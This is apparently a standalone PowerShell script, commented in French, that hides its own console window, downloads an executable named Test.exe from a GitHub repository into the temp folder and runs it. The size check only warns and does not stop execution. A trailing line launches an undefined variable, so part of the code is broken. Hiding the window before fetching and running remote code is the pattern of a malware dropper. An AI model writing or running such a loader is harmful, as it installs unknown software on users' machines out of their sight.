Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class ConsoleWindow {
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        public const int SW_HIDE = 0;
    }
"@

$consolePtr = [ConsoleWindow]::GetConsoleWindow()

[ConsoleWindow]::ShowWindow($consolePtr, [ConsoleWindow]::SW_HIDE)

[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12

# Définir l'URL du fichier à télécharger et le chemin de destination
$FileUrl = "https://github.com/Gabkill54/Kidou-Software/raw/main/Test.exe"
$DestinationPath = "$env:TEMP\Test.exe"

# Télécharger le fichier avec Invoke-WebRequest
try {
    Write-Output "Téléchargement de $FileUrl vers $DestinationPath..."
    
    Invoke-WebRequest -Uri $FileUrl -OutFile $DestinationPath -UseBasicParsing
    
    # Vérification de la taille du fichier téléchargé
    $downloadedFile = Get-Item $DestinationPath
    $expectedFileSize = 15MB # Remplacer par la taille attendue en Mo si connue
    
    Write-Output "Taille du fichier téléchargé : $($downloadedFile.Length / 1MB) MB"
    
    if ($downloadedFile.Length -ge ($expectedFileSize - 1MB) -and $downloadedFile.Length -le ($expectedFileSize + 1MB)) {
        Write-Output "Le fichier a été téléchargé correctement."
    } else {
        Write-Output "Avertissement : La taille du fichier téléchargé semble incorrecte."
    }

    # Lancer l'exécutable si la taille semble correcte
    if (Test-Path $DestinationPath) {
        Start-Process -FilePath $DestinationPath -Wait
    } else {
        Write-Output "Erreur : Le fichier n'a pas été trouvé après le téléchargement."
    }
    
} catch {
    Write-Output "Erreur lors du téléchargement ou de l'exécution : $_"
}


Start-Process -FilePath $FilePath -Wait

exit
